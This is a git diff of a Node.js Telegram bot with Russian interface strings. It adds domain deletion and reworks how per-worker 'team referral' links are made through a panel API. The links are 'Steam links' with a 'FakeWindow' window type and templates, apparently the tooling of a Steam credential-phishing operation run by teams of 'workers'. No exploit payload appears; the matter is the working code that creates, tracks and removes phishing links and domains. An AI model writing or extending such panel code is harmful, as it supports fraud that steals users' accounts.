@@ -1,10 +1,11 @@
-const { ensureUser, isTeamReferralPathTaken, getTeamReferralForDomain, upsertTeamReferral } = require("../services/userService");
+const { ensureUser, isTeamReferralPathTaken, getTeamReferralForDomain, upsertTeamReferral, clearTeamReferralForDomain } = require("../services/userService");
 const {
   authCredentials,
   getDomains,
   checkDomainAvailability,
   getActualIPs,
   createDomain,
+  deleteDomain,
   getSteamLinks,
   getTemplates,
   createSteamLink,
@@ -32,6 +33,7 @@ const {
   sitesKeyboard,
   sitesBindConfirmKeyboard,
   domainLinksKeyboard,
+  domainDeleteConfirmKeyboard,
   linkCreatorKeyboard,
   linkWindowTypeKeyboard,
   templatesKeyboard,
@@ -183,6 +185,61 @@ async function loadDomainById(token, ownerId, domainId) {
   const domain = domains.find((row) => Number(row.id) === Number(domainId));
   if (!domain) throw new Error("Домен недоступен.");
   return domain;
+}
+
+/** Ссылка воркера на домене в панели (по id или path). */
+async function findWorkerPanelLink(token, domainId, existing) {
+  if (!existing) return null;
+  const links = (await getSteamLinks(token, domainId, 0, 100)).rows || [];
+  return (
+    links.find(
+      (link) =>
+        (existing.panelLinkId != null && Number(link.id) === Number(existing.panelLinkId)) ||
+        String(link.path || "").replace(/^\/+/, "") === String(existing.path || "").replace(/^\/+/, "")
+    ) || null
+  );
+}
+
+async function createTeamReferralLink(auth, user, domainId) {
+  if (!Number.isFinite(env.referralTemplateId) || env.referralTemplateId <= 0) {
+    throw new Error("Не задан REFERRAL_TEMPLATE_ID.");
+  }
+
+  let lastError = null;
+  for (let attempt = 0; attempt < 40; attempt += 1) {
+    const path = generateReferralCode();
+    if (await isTeamReferralPathTaken(domainId, path)) continue;
+    try {
+      const created = await createSteamLink(auth.token, {
+        ...linkPayload(domainId, {
+          path,
+          windowType: "FakeWindow",
+          templateId: env.referralTemplateId,
+        }),
+        randPath: false,
+      });
+      const saved = {
+        domainId,
+        path: String(created?.path || path).replace(/^\/+/, ""),
+        panelLinkId: created?.id,
+      };
+      await upsertTeamReferral(user.telegramId, saved);
+      const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
+      return {
+        domainId: Number(domainId),
+        existing: saved,
+        domain,
+        row: created || saved,
+        ownDomain: Number(domain.owner) === auth.ownerId,
+      };
+    } catch (error) {
+      lastError = error;
+      const msg = String(error?.response?.data?.message || error.message || "");
+      if (/exist|taken|duplicate|unique|conflict/i.test(msg)) continue;
+      throw error;
+    }
+  }
+  throw lastError || new Error("Не удалось создать уникальную реферальную ссылку.");
 }
 
 function getReferralCache(ctx, domainId) {
@@ -354,6 +411,75 @@ function registerSitesHandlers(bot) {
       });
     } catch (error) {
       await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
+    }
+  });
+
+  bot.action(/^sites:domain:delete:(\d+)$/, async (ctx) => {
+    const domainId = Number(ctx.match[1]);
+    await ctx.answerCbQuery();
+    try {
+      const user = await ensureUser(ctx.from);
+      const auth = await resolvePanelAuth(ctx, user);
+      const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
+      if (Number(domain.owner) !== Number(auth.ownerId)) {
+        await upsertBotMessage(
+          ctx,
+          `${pe("error")} Удалить можно только свой домен.`,
+          { reply_markup: { inline_keyboard: [[btn("К сайтам", "menu:sites", "home")]] } }
+        );
+        return;
+      }
+      await upsertBotMessage(
+        ctx,
+        [
+          `${pe("delete")} <b>Удалить домен?</b>`,
+          "",
+          `Домен: <code>${escapeHtml(domain.domain)}</code>`,
+          "",
+          "Все ссылки на этом домене станут недоступны. Действие необратимо.",
+        ].join("\n"),
+        { reply_markup: domainDeleteConfirmKeyboard(domainId).reply_markup }
+      );
+    } catch (error) {
+      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
+    }
+  });
+
+  bot.action(/^sites:domain:delete:ok:(\d+)$/, async (ctx) => {
+    const domainId = Number(ctx.match[1]);
+    await ctx.answerCbQuery("Удаляю…");
+    try {
+      const user = await ensureUser(ctx.from);
+      const auth = await resolvePanelAuth(ctx, user);
+      const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
+      if (Number(domain.owner) !== Number(auth.ownerId)) {
+        throw new Error("Удалить можно только свой домен.");
+      }
+      await deleteDomain(auth.token, domainId);
+      await clearTeamReferralForDomain(user.telegramId, domainId);
+      clearReferralCache(ctx);
+      await upsertBotMessage(
+        ctx,
+        [
+          `${pe("success")} <b>Домен удалён</b>`,
+          "",
+          `Был удалён: <code>${escapeHtml(domain.domain)}</code>`,
+        ].join("\n"),
+        {
+          reply_markup: {
+            inline_keyboard: [[btn("К сайтам", "menu:sites", "home")]],
+          },
+        }
+      );
+    } catch (error) {
+      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
+        reply_markup: {
+          inline_keyboard: [
+            [btn("К домену", `sites:domain:${domainId}`, "link")],
+            [btn("К сайтам", "menu:sites", "home")],
+          ],
+        },
+      });
     }
   });
 
@@ -598,52 +724,38 @@ function registerSitesHandlers(bot) {
     await ctx.answerCbQuery();
     const user = await ensureUser(ctx.from);
     try {
+      const auth = await resolvePanelAuth(ctx, user);
       const cached = getReferralCache(ctx, domainId);
-      if (cached) {
-        await renderReferralCard(ctx, cached);
-        return;
+      if (cached?.existing) {
+        const panelLink = await findWorkerPanelLink(auth.token, domainId, cached.existing);
+        if (panelLink) {
+          cached.row = panelLink;
+          setReferralCache(ctx, cached);
+          await renderReferralCard(ctx, cached);
+          return;
+        }
+        clearReferralCache(ctx);
+        await clearTeamReferralForDomain(user.telegramId, domainId);
       }
 
-      const auth = await resolvePanelAuth(ctx, user);
-      const existing = await getTeamReferralForDomain(user.telegramId, domainId);
+      let existing = await getTeamReferralForDomain(user.telegramId, domainId);
+
+      // Старые записи могли указывать на ссылку владельца команды (до cookie-auth).
+      // Если на аккаунте воркера ссылки нет — пересоздаём.
       if (existing) {
-        await showReferral(ctx, user, domainId, auth, { force: true });
-        return;
-      }
-      if (!Number.isFinite(env.referralTemplateId) || env.referralTemplateId <= 0) {
-        throw new Error("Не задан REFERRAL_TEMPLATE_ID.");
-      }
-      for (let attempt = 0; attempt < 25; attempt += 1) {
-        const path = generateReferralCode();
-        if (await isTeamReferralPathTaken(domainId, path)) continue;
-        try {
-          const created = await createSteamLink(auth.token, {
-            ...linkPayload(domainId, { path, windowType: "FakeWindow", templateId: env.referralTemplateId }),
-            randPath: false,
-          });
-          const saved = {
-            domainId,
-            path: String(created?.path || path).replace(/^\/+/, ""),
-            panelLinkId: created?.id,
-          };
-          await upsertTeamReferral(user.telegramId, saved);
-          const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
-          setReferralCache(ctx, {
-            domainId,
-            existing: saved,
-            domain,
-            row: created || saved,
-            ownDomain: Number(domain.owner) === auth.ownerId,
-          });
-          await renderReferralCard(ctx, getReferralCache(ctx, domainId));
+        const panelLink = await findWorkerPanelLink(auth.token, domainId, existing);
+        if (panelLink) {
+          await showReferral(ctx, user, domainId, auth, { force: true });
           return;
-        } catch (error) {
-          if (!/exist|taken|duplicate|unique|conflict/i.test(String(error?.response?.data?.message || error.message))) {
-            throw error;
-          }
         }
+        await clearTeamReferralForDomain(user.telegramId, domainId);
+        existing = null;
+        clearReferralCache(ctx);
       }
-      throw new Error("Не удалось создать уникальную реферальную ссылку.");
+
+      const created = await createTeamReferralLink(auth, user, domainId);
+      setReferralCache(ctx, created);
+      await renderReferralCard(ctx, created);
     } catch (error) {
       await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
     }
